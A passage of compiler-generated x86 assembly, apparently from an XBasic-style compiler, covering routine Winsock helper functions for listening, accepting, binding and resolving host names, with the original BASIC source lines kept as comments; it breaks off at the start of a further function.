;  *****  FUNCTION  textRemove ()  *****
;  *****
func77.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody77.server:
;
; [3400] text = LEFT$(text,offset) + RIGHT$(text,LEN(text)-offset-chars)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp+16]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
; .xstk77.0000 = ebp-44	; internal variable
	mov	[ebp-44],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.508			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.508:
	mov	ebx,d[ebp+16]			;;; i665
	sub	eax,ebx			;;; i791
	mov	ebx,d[ebp+12]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,[ebp-44]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3401] RETURN text
	mov	eax,[ebp+8]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func77.server			;;; i258
;
; [3402] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.textRemove.server:  ;;; Function end label for Assembly Programmers.
end.func77.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  textRemove ()  *****
;  *****
;
; [3404] FUNCTION p2pListen(socket)
.code
;
#ifdef p2pListen.socket
#undef p2pListen.socket
#endif
#define p2pListen.socket ebp+8	; exposes function argument 'socket'
;
align 16
_p2pListen.server@4:
;  *****
;  *****  FUNCTION  p2pListen ()  *****
;  *****
func78.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody78.server:
;
; [3406] IF (listen(socket, 2) == $$SOCKET_ERROR) THEN
;
; [0] EXTERNAL SFUNCTION  listen           (socket, backlog)
	push	2			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_listen@8			;;; i619
	cmp	eax,-1			;;; i684a
	jne	>> else.0152.server			;;; i219
;
; [3407] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func78.server			;;; i258
;
; [3408] ELSE
	jmp	end.if.0152.server			;;; i107
else.0152.server:
;
; [3409] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func78.server			;;; i258
;
; [3410] END IF
end.if.0152.server:
;
; [3411] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.p2pListen.server:  ;;; Function end label for Assembly Programmers.
end.func78.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  p2pListen ()  *****
;  *****
;
; [3413] FUNCTION p2pAccept (socket, STRING remoteaddr)
.code
;
#ifdef p2pAccept.socket
#undef p2pAccept.socket
#endif
#define p2pAccept.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef p2pAccept.remoteaddr
#undef p2pAccept.remoteaddr
#endif
#define p2pAccept.remoteaddr ebp+12	; exposes function argument 'remoteaddr'
;
align 16
_p2pAccept.server@8:
;  *****
;  *****  FUNCTION  p2pAccept ()  *****
;  *****
func7C.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.516:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.516			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,180			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody7C.server:
;
; [3414] SOCKADDR_IN  sockaddrin
; .composites = ebp-40	; internal variable
#ifdef p2pAccept.sockaddrin
#undef p2pAccept.sockaddrin
#endif
#define p2pAccept.sockaddrin ebp-44	; exposes local variable 'sockaddrin'
;
;
; [3416] length = SIZE(sockaddrin)
#ifdef p2pAccept.length
#undef p2pAccept.length
#endif
#define p2pAccept.length ebp-48	; exposes local variable 'length'
;
	mov	eax,16			;;; i584
	mov	d[ebp-48],eax			;;; i670
;
; [3417] client = accept (socket, &sockaddrin, &length)
#ifdef p2pAccept.client
#undef p2pAccept.client
#endif
#define p2pAccept.client ebp-52	; exposes local variable 'client'
;
;
; [0] EXTERNAL SFUNCTION  accept           (socket, addrSOCKADDR, addrLength)
	mov	eax,d[ebp-44]			;;; i642
; .xstk7C.0000 = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
	lea	eax,[ebp-48]			;;; i642
	push	eax			;;; i667a
	push	[ebp-60]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_accept@12			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [3418] remoteaddr = CSTRING$(inet_ntoa(sockaddrin.sin_addr))
	sub	esp,64			;;; i487
;
; [0] EXTERNAL SFUNCTION  inet_ntoa        (in_addr)
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	push	eax			;;; i667a
	call	_inet_ntoa@4			;;; i619
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3419] RETURN client
	mov	eax,d[ebp-52]			;;; i665
	jmp	end.func7C.server			;;; i258
;
; [3420] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.p2pAccept.server:  ;;; Function end label for Assembly Programmers.
end.func7C.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  p2pAccept ()  *****
;  *****
;
; [3422] FUNCTION p2pCloseSocket (socket)
.code
;
#ifdef p2pCloseSocket.socket
#undef p2pCloseSocket.socket
#endif
#define p2pCloseSocket.socket ebp+8	; exposes function argument 'socket'
;
align 16
_p2pCloseSocket.server@4:
;  *****
;  *****  FUNCTION  p2pCloseSocket ()  *****
;  *****
func7B.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func7B.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,200			;;; i114a
;
funcBody7B.server:
;
; [3423] UBYTE buffer[]
#ifdef p2pCloseSocket.buffer
#undef p2pCloseSocket.buffer
#endif
#define p2pCloseSocket.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [3426] IFZ socket THEN RETURN 0
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0153.server			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func7B.server			;;; i258
else.0153.server:
end.if.0153.server:
;
; [3427] shutdown (socket,$$SD_SEND)
;
; [0] EXTERNAL SFUNCTION  shutdown         (socket, how)
	push	1			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_shutdown@8			;;; i619
;
; [3428] 't0 = GetTickCount()
;
; [3429] 'DIM buffer[1023]
;
; [3430] 'DO
;
; [3431] '	ret = recv(socket, &buffer[], SIZE(buffer[]), 0)
;
; [3432] '	IF (ret == $$SOCKET_ERROR) THEN EXIT DO
;
; [3433] '	IF (ret == 0) THEN EXIT DO
;
; [3434] 'LOOP WHILE ((GetTickCount()-t0) < 1000)
;
; [3435] RETURN closesocket (socket)
;
; [0] EXTERNAL SFUNCTION  closesocket      (socket)
	push	[ebp+8]			;;; i674a
	call	_closesocket@4			;;; i619
	jmp	end.func7B.server			;;; i258
;
; [3436] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.p2pCloseSocket.server:  ;;; Function end label for Assembly Programmers.
end.func7B.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func7B.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func7B.server:
	mov	esi,d[ebp-40]			;;; i665
	call	%_FreeArray			;;; i424
  ret
;-peep
;  *****
;  *****  END FUNCTION  p2pCloseSocket ()  *****
;  *****
;
; [3439] FUNCTION GetIPAddr (IPName$, numIPAddr$)
.code
;
#ifdef GetIPAddr.IPName$
#undef GetIPAddr.IPName$
#endif
#define GetIPAddr.IPName$ ebp+8	; exposes function argument 'IPName$'
;
;
#ifdef GetIPAddr.numIPAddr$
#undef GetIPAddr.numIPAddr$
#endif
#define GetIPAddr.numIPAddr$ ebp+12	; exposes function argument 'numIPAddr$'
;
align 16
_GetIPAddr.server@8:
;  *****
;  *****  FUNCTION  GetIPAddr ()  *****
;  *****
func7F.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.525:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.525			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,164			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,13				;;; ..
	xor	eax,eax			;;; ...
A.526:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.526			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+400]			;;; i125a
	lea	ecx,[esp+416]			;;; i125b
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
	mov	d[ebp-52],ecx			;;; i670
funcBody7F.server:
;
; [3440] WSADATA wsadata
; .composites = ebp-40	; internal variable
#ifdef GetIPAddr.wsadata
#undef GetIPAddr.wsadata
#endif
#define GetIPAddr.wsadata ebp-44	; exposes local variable 'wsadata'
;
;
; [3441] HOSTENT	host
#ifdef GetIPAddr.host
#undef GetIPAddr.host
#endif
#define GetIPAddr.host ebp-48	; exposes local variable 'host'
;
;
; [3444] IF (LEN(IPName$) < 3) THEN RETURN $$FALSE
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.521			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.521:
	cmp	eax,3			;;; i684a
	jge	>> else.0154.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func7F.server			;;; i258
else.0154.server:
end.if.0154.server:
;
; [3445] host = gethostbyname (&IPName$)
;
; [0] EXTERNAL SFUNCTION  HOSTENT   gethostbyname    (addrSTRING)
; .compositeReturnAddr.0 = ebp-52	; internal variable
	mov	eax,d[ebp+8]			;;; i642
	push	eax			;;; i667a
	mov	ebx,d[ebp-52]			;;; i665
	call	_gethostbyname@4			;;; i619
	mov	ebx,d[ebp-48]			;;; i665
	mov	edi,ebx			;;; i14a
	mov	esi,eax			;;; i7
	mov	ecx,16			;;; i1
	call	%_AssignComposite			;;; i2
;
; [3446] IF (host.h_addr_list != 0) THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
	cmp	eax,0			;;; i684a
	je	>> else.0155.server			;;; i219
;
; [3447] addr = 0
#ifdef GetIPAddr.addr
#undef GetIPAddr.addr
#endif
#define GetIPAddr.addr ebp-56	; exposes local variable 'addr'
;
	mov	eax,0			;;; i659
	mov	d[ebp-56],eax			;;; i670
;
; [3448] RtlMoveMemory (&addr, host.h_addr_list, 4)
;
; [0] EXTERNAL FUNCTION RtlMoveMemory (pDestination, pSource, cbLength)
	lea	eax,[ebp-56]			;;; i642
; .xstk7F.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
; .xstk7F.0001 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	push	4			;;; i656a
	push	[ebp-72]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	_RtlMoveMemory@12			;;; i619
;
; [3449] RtlMoveMemory (&addr, addr, 4)
	lea	eax,[ebp-56]			;;; i642
	mov	d[ebp-64],eax			;;; i670
	push	4			;;; i656a
	push	[ebp-56]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	_RtlMoveMemory@12			;;; i619
;
; [3450] addr2 = inet_ntoa (addr)
#ifdef GetIPAddr.addr2
#undef GetIPAddr.addr2
#endif
#define GetIPAddr.addr2 ebp-76	; exposes local variable 'addr2'
;
	push	[ebp-56]			;;; i674a
	call	_inet_ntoa@4			;;; i619
	mov	d[ebp-76],eax			;;; i670
;
; [3451] '		length = strlen (addr2)
;
; [3452] numIPAddr$ = NULL$ (512)
	sub	esp,64			;;; i487
	mov	d[esp],512
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3453] RtlMoveMemory (&numIPAddr$, addr2, LEN(numIPAddr$))
	mov	eax,d[ebp+12]			;;; i642
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.522			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.522:
	push	eax			;;; i667a
	push	[ebp-76]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	_RtlMoveMemory@12			;;; i619
;
; [3454] numIPAddr$ = CSIZE$ (numIPAddr$)
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3455] END IF
else.0155.server:
end.if.0155.server:
;
; [3457] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func7F.server			;;; i258
;
; [3458] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetIPAddr.server:  ;;; Function end label for Assembly Programmers.
end.func7F.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetIPAddr ()  *****
;  *****
;
; [3460] FUNCTION GetIPName (numIPAddr$, IPName$)
.code
;
#ifdef GetIPName.numIPAddr$
#undef GetIPName.numIPAddr$
#endif
#define GetIPName.numIPAddr$ ebp+8	; exposes function argument 'numIPAddr$'
;
;
#ifdef GetIPName.IPName$
#undef GetIPName.IPName$
#endif
#define GetIPName.IPName$ ebp+12	; exposes function argument 'IPName$'
;
align 16
_GetIPName.server@8:
;  *****
;  *****  FUNCTION  GetIPName ()  *****
;  *****
func80.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.531:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.531			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,13				;;; ..
	xor	eax,eax			;;; ...
A.532:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.532			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+400]			;;; i125a
	lea	ecx,[esp+416]			;;; i125b
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
	mov	d[ebp-56],ecx			;;; i670
funcBody80.server:
;
; [3461] WSADATA wsadata
; .composites = ebp-40	; internal variable
#ifdef GetIPName.wsadata
#undef GetIPName.wsadata
#endif
#define GetIPName.wsadata ebp-44	; exposes local variable 'wsadata'
;
;
; [3462] HOSTENT	host
#ifdef GetIPName.host
#undef GetIPName.host
#endif
#define GetIPName.host ebp-48	; exposes local variable 'host'
;
;
; [3465] IF (LEN(numIPAddr$) < 3) THEN RETURN $$FALSE
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.527			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.527:
	cmp	eax,3			;;; i684a
	jge	>> else.0156.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func80.server			;;; i258
else.0156.server:
end.if.0156.server:
;
; [3466] addr = inet_addr (&numIPAddr$)
#ifdef GetIPName.addr
#undef GetIPName.addr
#endif
#define GetIPName.addr ebp-52	; exposes local variable 'addr'
;
;
; [0] EXTERNAL SFUNCTION  inet_addr        (addrSTRING)
	mov	eax,d[ebp+8]			;;; i642
	push	eax			;;; i667a
	call	_inet_addr@4			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [3467] host = gethostbyaddr (&addr, 4, $$AF_INET)
;
; [0] EXTERNAL SFUNCTION  HOSTENT   gethostbyaddr    (addrSTRING, length, type)
; .compositeReturnAddr.0 = ebp-56	; internal variable
	lea	eax,[ebp-52]			;;; i642
; .xstk80.0000 = ebp-64	; internal variable
	mov	d[ebp-64],eax			;;; i670
	push	2			;;; i656a
	push	4			;;; i656a
	push	[ebp-64]			;;; i674a
	mov	ebx,d[ebp-56]			;;; i665
	call	_gethostbyaddr@12			;;; i619
	mov	ebx,d[ebp-48]			;;; i665
	mov	edi,ebx			;;; i14a
	mov	esi,eax			;;; i7
	mov	ecx,16			;;; i1
	call	%_AssignComposite			;;; i2
;
; [3468] IF host.h_name != 0 THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax]			;;; i313b
	cmp	eax,0			;;; i684a
	je	>> else.0157.server			;;; i219
;
; [3469] IPName$ = NULL$ (512)
	sub	esp,64			;;; i487
	mov	d[esp],512
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3470] RtlMoveMemory (&IPName$, host.h_name, LEN(IPName$))
	mov	eax,d[ebp+12]			;;; i642
	mov	d[ebp-64],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax]			;;; i313b
; .xstk80.0001 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.528			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.528:
	push	eax			;;; i667a
	push	[ebp-72]			;;; i674a
	push	[ebp-64]			;;; i674a
	call	_RtlMoveMemory@12			;;; i619
;
; [3471] IPName$ = CSIZE$ (IPName$)
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [3472] END IF
else.0157.server:
end.if.0157.server:
;
; [3474] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func80.server			;;; i258
;
; [3475] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetIPName.server:  ;;; Function end label for Assembly Programmers.
end.func80.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetIPName ()  *****
;  *****
;
; [3477] FUNCTION p2pBind (socket,ipaddress$,port)
.code
;
#ifdef p2pBind.socket
#undef p2pBind.socket
#endif
#define p2pBind.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef p2pBind.ipaddress$
#undef p2pBind.ipaddress$
#endif
#define p2pBind.ipaddress$ ebp+12	; exposes function argument 'ipaddress$'
;
;
#ifdef p2pBind.port
#undef p2pBind.port
#endif
#define p2pBind.port ebp+16	; exposes function argument 'port'
;
align 16
_p2pBind.server@12:
;  *****
;  *****  FUNCTION  p2pBind ()  *****
;  *****
func7D.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func7D.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.535:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.535			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody7D.server:
;
; [3478] SOCKADDR_IN udtSocket
; .composites = ebp-40	; internal variable
#ifdef p2pBind.udtSocket
#undef p2pBind.udtSocket
#endif
#define p2pBind.udtSocket ebp-44	; exposes local variable 'udtSocket'
;
;
; [3481] udtSocket.sin_family = $$AF_INET
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,2			;;; i659
	mov	w[eax],bx			;;; i13b
;
; [3482] udtSocket.sin_port = htons (port)
;
; [0] EXTERNAL SFUNCTION  htons            (hostshort)
	push	[ebp+16]			;;; i674a
	call	_htons@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	w[ebx+2],ax			;;; i13b
;
; [3483] udtSocket.sin_addr = inet_addr (&ipaddress$)
	mov	eax,d[ebp+12]			;;; i642
	push	eax			;;; i667a
	call	_inet_addr@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+4],eax			;;; i13b
;
; [3485] IF (udtSocket.sin_addr == $$INADDR_NONE) THEN
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	cmp	eax,-1			;;; i684a
	jne	>> else.0158.server			;;; i219
;
; [3486] GetIPAddr (ipaddress$, @numIPAddr$)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk7D.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
#ifdef p2pBind.numIPAddr$
#undef p2pBind.numIPAddr$
#endif
#define p2pBind.numIPAddr$ ebp-56	; exposes local variable 'numIPAddr$'
;
	push	[ebp-56]			;;; i674a
	push	[ebp-52]			;;; i674a
	call	func7F.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-56],ecx			;;; i670
	add	esp,8			;;; i633
;
; [3487] udtSocket.sin_addr = inet_addr (&numIPAddr$)
	mov	eax,d[ebp-56]			;;; i642
	push	eax			;;; i667a
	call	_inet_addr@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+4],eax			;;; i13b
;
; [3488] END IF
else.0158.server:
end.if.0158.server:
;
; [3489] IF (bind (socket, &udtSocket, SIZE (udtSocket)) == $$SOCKET_ERROR) THEN
;
; [0] EXTERNAL SFUNCTION  bind             (socket, addrSOCKADDR, length)
	mov	eax,d[ebp-44]			;;; i642
	mov	d[ebp-52],eax			;;; i670
	mov	eax,16			;;; i584
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_bind@12			;;; i619
	cmp	eax,-1			;;; i684a
	jne	>> else.0159.server			;;; i219
;
; [3490] ''CPrint ("* wsa error: "+ STRING$(WSAGetLastError ()))
;
; [3491] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func7D.server			;;; i258
;
; [3492] ELSE
	jmp	end.if.0159.server			;;; i107
else.0159.server:
;
; [3493] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func7D.server			;;; i258
;
; [3494] END IF
end.if.0159.server:
;
; [3496] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.p2pBind.server:  ;;; Function end label for Assembly Programmers.
end.func7D.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func7D.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
free.func7D.server:
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  p2pBind ()  *****
;  *****
;
; [3498] FUNCTION p2pCreateBindSocket (addy$,port,socket)
.code
;
#ifdef p2pCreateBindSocket.addy$
#undef p2pCreateBindSocket.addy$
#endif
#define p2pCreateBindSocket.addy$ ebp+8	; exposes function argument 'addy$'
;
;
#ifdef p2pCreateBindSocket.port
